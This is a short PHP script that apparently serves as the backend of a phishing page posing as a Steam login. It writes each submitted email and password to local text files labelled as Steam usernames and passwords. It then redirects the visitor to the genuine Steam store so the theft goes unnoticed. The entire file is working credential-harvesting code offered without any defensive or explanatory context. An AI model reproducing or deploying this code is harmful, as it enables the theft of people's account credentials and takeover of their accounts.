<?php

file_put_contents("usernames.txt", "Steam Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Steam Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://store.steampowered.com/');
?>
